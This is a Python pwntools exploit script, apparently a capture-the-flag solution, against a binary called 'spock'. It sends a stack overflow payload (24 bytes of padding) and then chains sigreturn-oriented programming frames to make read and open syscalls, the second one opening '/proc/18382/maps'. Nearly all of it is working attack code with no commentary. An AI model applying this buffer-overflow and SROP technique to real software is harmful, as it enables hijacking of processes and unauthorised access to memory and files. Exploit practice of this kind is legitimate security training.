#!/usr/bin/python3

from pwn import *

exe = ELF('spock', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

        b* 0x40169B
        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
GDB()

frame = SigreturnFrame(kernel='amd64')
frame.rax = constants.SYS_read
frame.rdi = 0
frame.rsi = 0x404a00
frame.rdx = 0x100
frame.rsp = 0x404a10
frame.rip = 0x000000000040121c

pa = b'a'*24 + flat(0x000000000040121b, 0xf) + bytes(frame)
sa(b'>>>', pa)
input()
frame.rax = constants.SYS_open
frame.rdi = 0x404a00
frame.rsi = 0x72    
frame.rdx = 0x404a10    
frame.rsp = 0x404a10
frame.rip = 0x000000000040121c
s(b'/proc/18382/maps'.ljust(16) + flat(0x000000000040121b, 0xf) + bytes(frame))



p.interactive()
